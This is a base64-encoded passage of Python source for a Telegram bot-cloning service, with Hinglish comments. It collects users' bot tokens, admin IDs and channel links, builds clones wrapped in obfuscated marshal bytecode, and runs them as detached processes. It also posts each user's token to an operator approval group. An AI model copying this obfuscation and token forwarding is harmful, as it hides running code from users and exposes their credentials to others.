heWxvYWQgKGJvdHBhbHlzLXN0eWxlIGVzY2FwaW5nKSDigJQga29pIGJvb3QtYmxvY2svbWFya2VyIGFkZCBuYWhpLgogICAgIyBDbG9uZSBiaGkgYmlsa3VsIG5vbi1wcmVtaXVtLnB5IGphaXNhIGRpa2hlZ2EsIHZhbHVlcyBwYXlsb2FkIG1lIGJha2VkLgogICAgIyBUb3AgcGUgcmVhZGFibGUgQ0xPTkUgREFUQSBoZWFkZXIgLS0gdXNlciBhcG5hIHRva2VuL2FkbWluL2NoYW5uZWxzIGZpbGUKICAgICMga2hvbHRlIGhpIHBsYWluIHRleHQgbWUgZGVraCBzYWtlIChwYXlsb2FkIG1lIGJoaSBiYWtlZCByZWh0ZSBoYWluKS4KICAgIGhkciA9ICgiIyA9PT09IENMT05FIERBVEEgPT09PVxuIgogICAgICAgICAgICIjIHRva2VuOiAlc1xuIgogICAgICAgICAgICIjIGFkbWluOiAlZFxuIgogICAgICAgICAgICIjIGNoMTogJXNcbiIKICAgICAgICAgICAiIyBjaDI6ICVzXG4iCiAgICAgICAgICAgIiMgY2gzOiAlc1xuIgogICAgICAgICAgICIjIHNlc3Npb246ICVzXG4iCiAgICAgICAgICAgIiMgcnVuOiBweXRob24zLjEzIHRoaXNfZmlsZS5weVxuIgogICAgICAgICAgICIjID09PT0gRU5EIENMT05FIERBVEEgPT09PVxuIikgJSAodG9rZW4sIGFkbWluLCBjaDEsIGwyLCBsMywgbWFya2VyWyJzZXNzIl0pCiAgICBvdXQgPSBoZHIgKyB0cGxfdGV4dC5yZXBsYWNlKHdyYXAsIF9jbHpfbnBfd3JhcGxpbmUocGF0Y2hlZCkpCiAgICBpZiAiXyA9IGxhbWJkYSIgbm90IGluIG91dCBvciAibWFyc2hhbCIgbm90IGluIG91dDoKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIk5QIG91dHB1dCB3cmFwcGVyIG1pc3NpbmciKQogICAgcmV0dXJuIG91dAoKCiMgLS0tLS0tLS0tLSBQUk9DRVNTIEhFTFBFUlMgLS0tLS0tLS0tLQoKZGVmIF9jbHpfcHlfZm9yKHBhdGgpOgogICAgIiIiTlAgY2xvbmVzIGthIHBheWxvYWQgUHl0aG9uIDMuMTMgYnl0ZWNvZGUgaGUg4oCUIDMuMTEgZXhlYyBjcmFzaCBrYXJ0YSBoZS4KICAgIE5QIGZpbGUgKGJvdHBhbHlzIHdyYXBwZXIpIGtlIGxpeWUgcHl0aG9uMy4xMyBkaG9vbmRvLCB3YXJuYSBzeXMuZXhlY3V0YWJsZS4iIiIKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiLCBlcnJvcnM9InN1cnJvZ2F0ZWVzY2FwZSIpIGFzIGY6CiAgICAgICAgICAgIGhlYWQgPSBmLnJlYWQoMzAwMDAwKSAgIyBsZWdhY3kgY2xvbmUgbWUgd3JhcHBlciB+NjFLQiBiYWFkIGhlLCBpc2xpeWUgYmFkYSByZWFkCiAgICAgICAgaWYgIl8gPSBsYW1iZGEiIGluIGhlYWQgYW5kICJtYXJzaGFsIiBpbiBoZWFkOgogICAgICAgICAgICBpbXBvcnQgc2h1dGlsIGFzIF9zcF9zaAogICAgICAgICAgICBmb3IgY2FuZCBpbiAoX3NwX3NoLndoaWNoKCJweXRob24zLjEzIiksICIvdXNyL2xvY2FsL2Jpbi9weXRob24zLjEzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICIvdXNyL2Jpbi9weXRob24zLjEzIiwgb3MucGF0aC5qb2luKHN5cy5wcmVmaXgsICJiaW4iLCAicHl0aG9uMy4xMyIpKToKICAgICAgICAgICAgICAgIGlmIGNhbmQgYW5kIG9zLnBhdGguaXNmaWxlKGNhbmQpOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBjYW5kCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKICAgIHJldHVybiBzeXMuZXhlY3V0YWJsZQoKCmRlZiBfY2x6X3NwYXduKHBhdGgpOgogICAgdHJ5OgogICAgICAgIHAgPSBzdWJwcm9jZXNzLlBvcGVuKFtfY2x6X3B5X2ZvcihwYXRoKSwgcGF0aF0sIGN3ZD1vcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKHBhdGgpKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRpbj1zdWJwcm9jZXNzLkRFVk5VTEwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnRfbmV3X3Nlc3Npb249VHJ1ZSkKICAgICAgICBwcmludCgiW0NMWl0gc3Bhd25lZCAlcyBwaWQ9JXMiICUgKG9zLnBhdGguYmFzZW5hbWUocGF0aCksIHAucGlkKSkKICAgICAgICByZXR1cm4gcC5waWQKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiW0NMWl0gc3Bhd24gZmFpbDoiLCBlKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgX2Nsel9hbGl2ZShwaWQpOgogICAgaWYgbm90IHBpZDoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIHRyeToKICAgICAgICBvcy5raWxsKHBpZCwgMCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IFByb2Nlc3NMb29rdXBFcnJvcjoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIFRydWUKCmRlZiBfY2x6X2tpbGwocGlkKToKICAgIGlmIG5vdCBwaWQ6CiAgICAgICAgcmV0dXJuCiAgICB0cnk6CiAgICAgICAgb3Mua2lsbHBnKHBpZCwgOSkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgdHJ5OgogICAgICAgIG9zLmtpbGwocGlkLCA5KQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCgojIC0tLS0tLS0tLS0gVEVYVFMgLS0tLS0tLS0tLQoKQ0xaX1RYVF9UT1AgPSAoCiAgICAiXFUwMDAxRjlFQyA8Yj5cdTFkMDRcdTAyOWZcdTFkMGZcdTAyNzRcdTFkMDcgXHUxZDIyXHUxZDBmXHUxZDFiIFx1YTczMFx1MWQwMFx1MWQwNFx1MWQxYlx1MWQwZlx1MDI4MFx1MDI4ZjwvYj5cbiIKICAgICJcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcbiIKICAgICJcdTI3MjggQXBuYSA8Yj5PV04gY2hlY2tlciBib3Q8L2I+IGJhbmFvIVxuXG4iCiAgICAiXHUyYjUwIDxiPlx1MWQxOFx1MDI4MFx1MWQwN1x1MWQwZFx1MDI2YVx1MWQxY1x1MWQwZCBcdTFkMjJcdTFkMGZcdTFkMWI8L2I+IFx1MjE5MiBwcmVtaXVtIGVtb2ppIGJ1dHRvbnMgd2FsYSBib3RcbiIKICAgICJcdTI2OTlcdWZlMGYgPGI+XHUwMjc0XHUxZDBmXHUwMjc0IFx1MWQxOFx1MDI4MFx1MWQwN1x1MWQwZFx1MDI2YVx1MWQxY1x1MWQwZCBcdTFkMjJcdTFkMGZcdTFkMWI8L2I+IFx1MjE5MiBub3JtYWwgZW1vamkgYm90XG5cbiIKICAgICJcVTAwMDFGNENBIDxiPlx1MDI5Zlx1MDI2YVx1MWQwZFx1MDI2YVx1MWQxYnM6PC9iPlxuIgogICAgIlx1MjUxYyBcVTAwMDFGNTEzIEZyZWU6IDxiPjEgYm90ICgyNCBob3Vycyk8L2I+XG4iCiAgICAiXHUyNTE0IFxVMDAwMUY0OEUgUHJlbWl1bTogPGI+MyBib3RzPC9iPiAocGxhbiBhY3RpdmUgdGFrKVxuXG4iCiAgICAiXFUwMDAxRjQ0NyBCb3QgdHlwZSBjaG9vc2Uga2FybzoiCikKCkNMWl9UWFRfVE9LRU4gPSAoCiAgICAiXFUwMDAxRjlFQyA8Yj5cdTAyOWZcdTFkMWJcdTFkMDdcdTFkMTggMS81IFx1MjAxNCBcdTFkMjJcdTFkMGZcdTFkMWIgXHUxZDFiXHUxZDBmXHUxZDBiXHUxZDA3XHUwMjc0PC9iPlxuIgogICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgIlx1MjY5OVx1ZmUwZiA8aT5AQm90RmF0aGVyPC9pPiBcdTIxOTIgPGNvZGU+L25ld2JvdDwvY29kZT4gXHUyMTkyIHRva2VuIGNvcHkga2Fya2UgeWFoYW4gcGFzdGUga2Fyby5cblxuIgogICAgIlxVMDAwMUY0RTggRm9ybWF0OiA8Y29kZT4xMjM0NTY3ODk6QUF4eHh4eC4uLjwvY29kZT4iCikKCkNMWl9UWFRfQURNSU4gPSAoCiAgICAiXFUwMDAxRjlFQyA8Yj5cdTAyOWZcdTFkMWJcdTFkMDdcdTFkMTggMi81IFx1MjAxNCBcdTFkMDBcdTFkMDVcdTFkMGRcdTAyNmFcdTAyNzQgXHUwMjZhXHUxZDA1PC9iPlxuIgogICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgIlxVMDAwMUY0NjQgQXBuaSBUZWxlZ3JhbSBudW1lcmljIElEIGJoZWpvIFx1MjAxNCB5ZSBjbG9uZSBrYSA8Yj5PV05FUjwvYj4gYmFuZWdhLlxuIgogICAgIlx1MjY5OVx1ZmUwZiA8aT5ATWlzc1Jvc2VfQm90IG1lIC9pZCBsaWtoby48L2k+XG5cbiIKICAgICJcVTAwMDFGNEU4IEZvcm1hdDogPGNvZGU+NjY1Mjk3NTIyMzwvY29kZT4iCikKCkNMWl9UWFRfQ0gxID0gKAogICAgIlxVMDAwMUY5RUMgPGI+XHUwMjlmXHUxZDFiXHUxZDA3XHUxZDE4IDMvNSBcdTIwMTQgXHUxZDA0XHUwMjljXHUxZDAwXHUwMjc0XHUwMjc0XHUxZDA3XHUwMjlmIDEgKOG0nHPhtIfKgMm04bSA4bSN4bSHKTwvYj5cbiIKICAgICJcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcbiIKICAgICJcVTAwMDFGNTE3IEZvcmNlLWpvaW4gPGI+Q2hhbm5lbCAxPC9iPiBrYSBsaW5rIGJoZWpvLlxuXG4iCiAgICAiXHUyNmEwXHVmZTBmIFNpcmYgPGI+cHVibGljPC9iPiBjaGFubmVsOiA8Y29kZT5odHRwczovL3QubWUveW91cmNoYW5uZWw8L2NvZGU+IHlhIDxjb2RlPkB5b3VyY2hhbm5lbDwvY29kZT5cbiIKICAgICJcdTI3NGMgUHJpdmF0ZS9qb2luY2hhdCBsaW5rcyB5YWhhbiBuYWhpIGNoYWxlbmdpLiIKKQoKQ0xaX1RYVF9DSDIgPSAoCiAgICAiXFUwMDAxRjlFQyA8Yj5cdTAyOWZcdTFkMWJcdTFkMDdcdTFkMTggNC81IFx1MjAxNCBcdTFkMDRcdTAyOWNcdTFkMDBcdTAyNzRcdTAyNzRcdTFkMDdcdTAyOWYgMiBcdTAyOWZcdTAyNmFcdTAyNzRcdTFkMGI8L2I+XG4iCiAgICAiXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXG4iCiAgICAiXFUwMDAxRjUxNyBGb3JjZS1qb2luIDxiPkNoYW5uZWwgMjwvYj4ga2EgZnVsbCBsaW5rIGJoZWpvIChwdWJsaWMgeWEgcHJpdmF0ZSBkb25vIGNoYWxlZ2EpLlxuXG4iCiAgICAiXFUwMDAxRjRFOCA8Y29kZT5odHRwczovL3QubWUveHh4eDwvY29kZT4iCikKCkNMWl9UWFRfQ0gzID0gKAogICAgIlxVMDAwMUY5RUMgPGI+XHUwMjlmXHUxZDFiXHUxZDA3XHUxZDE4IDUvNSBcdTIwMTQgXHUxZDA0XHUwMjljXHUxZDAwXHUwMjc0XHUwMjc0XHUxZDA3XHUwMjlmIDMgXHUwMjlmXHUwMjZhXHUwMjc0XHUxZDBiPC9iPlxuIgogICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgIlxVMDAwMUY1MTcgRm9yY2Utam9pbiA8Yj5DaGFubmVsIDM8L2I+IGthIGZ1bGwgbGluayBiaGVqby5cblxuIgogICAgIlxVMDAwMUY0RTggPGNvZGU+aHR0cHM6Ly90Lm1lL3h4eHg8L2NvZGU+IgopCgpDTFpfVFhUX0JBRCA9ICJcdTI3NGMgPGI+XHUwMjZhXHUwMjc0XHUxZDIwXHUxZDAwXHUwMjlmXHUwMjZhXHUxZDA1IFx1YTczMFx1MWQwZlx1MDI4MFx1MWQwZFx1MWQwMFx1MWQxYiE8L2I+IFx1MjE5MiBEb2JhcmEgc2FoaSBmb3JtYXQgbWUgYmhlam8uIgoKZGVmIF9jbHpfY29uZmlybV90eHQodyk6CiAgICBraW5kID0gIlBSRU1JVU0iIGlmIHcuZ2V0KCJraW5kIikgPT0gInByZW1pdW0iIGVsc2UgIk5PTi1QUkVNSVVNIgogICAgcmV0dXJuICgKICAgICAgICAiXFUwMDAxRjlFQyA8Yj5cdTFkMDRcdTFkMGZcdTAyNzRcdWE3MzBcdTAyNmFcdTAyODBcdTFkMGQgXHUxZDA1XHUxZDA3XHUxZDFiXHUxZDAwXHUwMjZhXHUwMjlmczwvYj5cbiIKICAgICAgICAiXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXG4iCiAgICAgICAgIlxVMDAwMUY5MTYgVHlwZTogPGI+JXM8L2I+XG4iCiAgICAgICAgIlxVMDAwMUY1MTEgVG9rZW46IDxjb2RlPiVzPC9jb2RlPlxuIgogICAgICAgICJcVTAwMDFGNDY0IEFkbWluIElEOiA8Y29kZT4lczwvY29kZT5cbiIKICAgICAgICAiXFUwMDAxRjRFMSBDSDE6IDxjb2RlPkAlczwvY29kZT5cbiIKICAgICAgICAiXFUwMDAxRjUxNyBDSDI6IDxjb2RlPiVzPC9jb2RlPlxuIgogICAgICAgICJcVTAwMDFGNTE3IENIMzogPGNvZGU+JXM8L2NvZGU+XG4iCiAgICAgICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgICAgICJcdTI2YTBcdWZlMGYgRmlsZSA8Yj5hcHByb3ZhbCBncm91cDwvYj4gbWUgamF5ZWdpIFx1MjAxNCBhcHByb3ZlIGhvbmUgcGUgYm90IFxVMDAwMUY1MjVMSVZFXFUwMDAxRjUyNSBobyBqYXllZ2EuIgogICAgKSAlIChraW5kLCB3LmdldCgidG9rZW4iKSwgdy5nZXQoImFkbWluIiksIHcuZ2V0KCJjaDEiKSwgdy5nZXQoImwyIiksIHcuZ2V0KCJsMyIpKQoKQ0xaX1RYVF9PSyA9ICgKICAgICJcdTI3MDUgPGI+XHUwMjlmXHUxZDFjXHUxZDA1XHUxZDBkXHUwMjZhXHUxZDFiXHUxZDFiXHUxZDA3XHUxZDA1IFx1YTczMFx1MWQwZlx1MDI4MCBcdTFkMDBcdTFkMThcdTFkMThcdTAyODBcdTFkMGZcdTAyOGJcdTFkMDBcdTAyOWYhPC9iPlxuIgogICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgIlxVMDAwMUY5RUMgQ2xvbmUgZmlsZSBhcHByb3ZhbCBncm91cCBtZSBiaGVqIGRpIGdheWkuXG4iCiAgICAiXFUwMDAxRjQ1MSBBZG1pbiBhcHByb3ZlIGthcmVnYSBcdTIxOTIgYm90IFxVMDAwMUY2ODBMSVZFIVxuIgogICAgIlx1MjNmMyBGcmVlOiAyNGggfCBcVTAwMDFGNDhFIFByZW1pdW06IHBsYW4gYWN0aXZlIHRhay4iCikKCkNMWl9UWFRfUSA9ICgKICAgICJcdTI2YTBcdWZlMGYgPGI+XHUxZDAwXHUxZDE4XHUxZDE4XHUwMjgwXHUxZDBmXHUwMjhiXHUxZDAwXHUwMjlmIFx1MDI2Mlx1MDI4MFx1MWQwZlx1MWQxY1x1MWQxOCBcdTFkMThcdTFkMDdcdTAyNzRcdTFkMDVcdTAyNmFcdTAyNzRcdTAyNjI8L2I+XG4iCiAgICAiXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXG4iCiAgICAiT3duZXIgbmUgYWJoaSB0YWsgZ3JvdXAgbWUgPGNvZGU+L2Nsb25lZ3JvdXA8L2NvZGU+IG5haGkgYmhlamEuXG4iCiAgICAiXFUwMDAxRjRFNCBUdW1oYXJpIHJlcXVlc3QgcXVldWUgbWUgaGUgXHUyMDE0IGdyb3VwIHNldCBob3RlIGhpIGFkbWluIGtvIGZpbGUgY2hhbGkgamF5ZWdpLiIKKQoKQ0xaX1RYVF9BUFJWID0gKAogICAgIlxVMDAwMUY5RUMgPGI+XHUwMjc0XHUxZDA3XHUxZDIxIFx1MWQwNFx1MDI5Zlx1MWQwZlx1MDI3NFx1MWQwNyBcdTAyODBcdTFkMDdRXHUxZDFjXHUxZDA3c1x1MWQxYjwvYj5cbiIKICAgICJcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcbiIKICAgICJcVTAwMDFGNDY0IFVzZXI6IDxhIGhyZWY9XCJ0ZzovL3VzZXI/aWQ9JXNcIj4lczwvYT5cbiIKICAgICJcVTAwMDFGOTE2IFR5cGU6IDxiPiVzPC9iPlxuIgogICAgIlxVMDAwMUY0Q0EgUGxhbjogPGI+JXM8L2I+XG4iCiAgICAiXFUwMDAxRjRFMSBDSDE6IDxjb2RlPkAlczwvY29kZT5cbiIKICAgICJcVTAwMDFGNTE3IENIMjogPGNvZGU+JXM8L2NvZGU+XG4iCiAgICAiXFUwMDAxRjUxNyBDSDM6IDxjb2RlPiVzPC9jb2RlPlxuIgogICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgIlxVMDAwMUY0NTEgQXBwcm92ZSBcdTIxOTIgdXNlciBrZSBkYXRhIG1lIGJvdCBhZGQgKyBMSVZFLiIKKQoKQ0xaX1RYVF9FWFBfRlJFRSA9ICgKICAgICJcdTIzZjAgPGI+XHVhNzMwXHUwMjgwXHUxZDA3XHUxZDA3IFx1MDI5Zlx1MDI2YVx1MWQwZFx1MDI2YVx1MWQxYiBcdTFkMDd4XHUxZDE4XHUwMjZhXHUwMjgwXHUxZDA3XHUxZDA1ICgyNFx1MDI5Yyk8L2I+XG4iCiAgICAiXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXHUyNTAxXG4iCiAgICAiXFUwMDAxRjQ2NCBVc2VyOiA8YSBocmVmPVwidGc6Ly91c2VyP2lkPSVzXCI+JXM8L2E+XG4iCiAgICAiXFUwMDAxRjlFQyBVc2thIGNsb25lIGJvdCAyNGggY29tcGxldGUgaG8gZ2F5YS4gQWIga3lhIGthcm5hIGhlPyIKKQoKQ0xaX1RYVF9FWFBfUFJFTSA9ICgKICAgICJcVTAwMDFGNDhFIDxiPlx1MWQxOFx1MDI4MFx1MWQwN1x1MWQwZFx1MDI2YVx1MWQxY1x1MWQwZCBcdTFkMThcdTAyOWZcdTFkMDBcdTAyNzQgXHUxZDA3eFx1MWQxOFx1MDI2YVx1MDI4MFx1MWQwN1x1MWQwNTwvYj5cbiIKICAgICJcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcdTI1MDFcbiIKICAgICJcVTAwMDFGNDY0IFVzZXI6IDxhIGhyZWY9XCJ0ZzovL3VzZXI/aWQ9JXNcIj4lczwvYT5cbiIKICAgICJcVTAwMDFGOUVDIFVza2EgcHJlbWl1bSBraGF0YW0gXHUyMDE0IGNsb25lIGJvdCBrYSBreWEga2FybmEgaGU/IgopCgpDTFpfVFhUX0FQUFJPVkVEX0RNID0gKAogICAgIlxVMDAwMUYzODkgPGI+XHUxZDA0XHUwMjlmXHUxZDBmXHUwMjc0XHUxZDA3IFx1MWQyMlx1MWQwZlx1MWQxYiBcdTFkMDBcdTFkMThcdTFkMThcdTAyODBcdTFkMGZcdTAyOGJcdTFkMDdcdTFkMDUhPC9iPlxuIgogICAgIlx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVx1MjUwMVxuIgogICAgIlxVMDAwMUY5RUMgVHVtaGFyYSAlcyBib3QgXFUwMDAxRjY4MExJVkUgaG8gZ2F5YSFcbiIKICAgICJcdTIzZjMgTGltaXQ6ICVzXG4iCiAgICAiXHUyNjdiXHVmZTBmIEJvdCBhdXRvLXJ1biBobyByYWhhIGhlIFx1MjAxNCBrdWNoIG5haGkga2FybmEuIgopCgojIC0tLS0tLS0tLS0gUEFSU0VSUyAtLS0tLS0tLS0tCgpkZWYgX2Nsel9wYXJzZV91c2VyKHQpOgogICAgdCA9ICh0IG9yICIiKS5zdHJpcCgpCiAgICBpZiBub3QgdDoKICAgICAgICByZXR1cm4gTm9uZQogICAgaWYgdC5zdGFydHN3aXRoKCJAIik6CiAgICAgICAgdCA9IHRbMTpdCiAgICBtID0gcmUubWF0Y2gociIoPzpodHRwcz86Ly8pPyg/Ond3d1wuKT90XC5tZS8oPzpzLyk/KFtBLVphLXowLTlfXXszLDMyfSkvPyQiLCB0LCByZS5JKQogICAgaWYgbToKICAgICAgICB1ID0gbS5ncm91cCgxKQogICAgZWxpZiByZS5tYXRjaChyIl5bQS1aYS16MC05X117MywzMn0kIiwgdCk6CiAgICAgICAgdSA9IHQKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIGlmIHUubG93ZXIoKSBpbiAoImpvaW5jaGF0IiwgImMiLCAic2hhcmUiLCAiYWRkc3RpY2tlcnMiLCAicHJveHkiLCAic29ja3MiLCAiYWRkYm90IiwgImJvdHMiKToKICAgICAgICByZXR1cm4gTm9uZQogICAgcmV0dXJuIHUKCmRlZiBfY2x6X3BhcnNlX2xpbmsodCk6CiAgICB0ID0gKHQgb3IgIiIpLnN0cmlwKCkKICAgIGlmIG5vdCB0OgogICAgICAgIHJldHVybiBOb25lCiAgICBpZiB0LnN0YXJ0c3dpdGgoIkAiKToKICAgICAgICByZXR1cm4gImh0dHBzOi8vdC5tZS8iICsgdFsxOl0KICAgIGxvdyA9IHQubG93ZXIoKQogICAgaWYgInQubWUvIiBub3QgaW4gbG93IGFuZCAidGVsZWdyYW0ubWUvIiBub3QgaW4gbG93IGFuZCAidGVsZWdyYW0uZG9nLyIgbm90IGluIGxvdzoKICAgICAgICByZXR1cm4gTm9uZQogICAgaWYgbm90IGxvdy5zdGFydHN3aXRoKCJodHRwIik6CiAgICAgICAgdCA9ICJodHRwczovLyIgKyB0CiAgICByZXR1cm4gdAoKIyAtLS0tLS0tLS0tIExJTUlUUyAtLS0tLS0tLS0tCgpkZWYgX2Nsel9saW1pdF9tc2codWlkKToKICAgIHRyeToKICAgICAgICBpZiBpc19hZG1pbih1aWQpOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIGMgPSBfY2x6X2NvdW50cyh1aWQpCiAgICAgICAgaWYgaXNfcHJlbWl1bSh1aWQpOgogICAgICAgICAgICBpZiBjID49IENMWl9QUkVNX01BWDoKICAgICAgICAgICAgICAgIHJldHVybiAiXHUyNmEwXHVmZTBmIFByZW1pdW0gbGltaXQgKDMgYm90cykgcmVhY2hlZCEiCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgaWYgYyA+PSBDTFpfRlJFRV9NQVg6CiAgICAgICAgICAgIHJldHVybiAiXHUyNmEwXHVmZTBmIEZyZWUgbGltaXQ6IDEgYm90ICgyNGgpLiBQcmVtaXVtIGxvIFx1MjAxNCAzIGJvdHMgdW5saW1pdGVkIHBsYW4gdGFrISIKICAgICAgICByZXR1cm4gTm9uZQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gTm9uZQoKIyAtLS0tLS0tLS0tIEdST1VQIFNFTkQgLS0tLS0tLS0tLQoKYXN5bmMgZGVmIF9jbHpfc2VuZF9ncm91cCh1aWQsIGVudHJ5KToKICAgIGdpZCA9IF9jbHpfY2ZnKCkuZ2V0KCJncm91cCIpCiAgICBpZiBub3QgZ2lkOgogICAgICAgIHJldHVybiBGYWxzZQogICAgdHJ5OgogICAgICAgIGNhcCA9IENMWl9UWFRfQVBSViAlICh1aWQsIHVpZCwgZW50cnkuZ2V0KCJraW5kIiwgIj8iKS51cHBlcigpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRlJFRSAoMjRoKSIgaWYgZW50cnkuZ2V0KCJwbGFuIikgPT0gImZyZWUiIGVsc2UgIlBSRU1JVU0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5nZXQoImNoMSIsICI/IiksIGVudHJ5LmdldCgibDIiLCAiPyIpLCBlbnRyeS5nZXQoImwzIiwgIj8iKSkKICAgICAgICBtc2cgPSBhd2FpdCBfY2x6X3NmKCkoZ2lkLCBmaWxlPWVudHJ5WyJmaWxlIl0sIGNhcHRpb249cHJlbWl1bV9lbW9qaShjYXApLCBwYXJzZV9tb2RlPSJodG1sIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yY2VfZG9jdW1lbnQ9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnV0dG9ucz1bWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQnV0dG9uLmlubGluZSgiXHUyNzA1IFx1MWQwMFx1MWQxOFx1MWQxOFx1MDI4MFx1MWQwZlx1MDI4Ylx1MWQwNyIsICgiY2x6YV8lc18lcyIgJSAodWlkLCBlbnRyeVsibiJdKSkuZW5jb2RlKCksIHN0eWxlPSJzdWNjZXNzIiwgaWNvbj1yYl9pY29uKCkpXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCdXR0b24uaW5saW5lKCJcdTI3NGMgXHUwMjgwXHUxZDA3XHUwMjljXHUxZDA3XHUxZDA0XHUxZDFiIiwgKCJjbHpyXyVzXyVzIiAlICh1aWQsIGVudHJ5W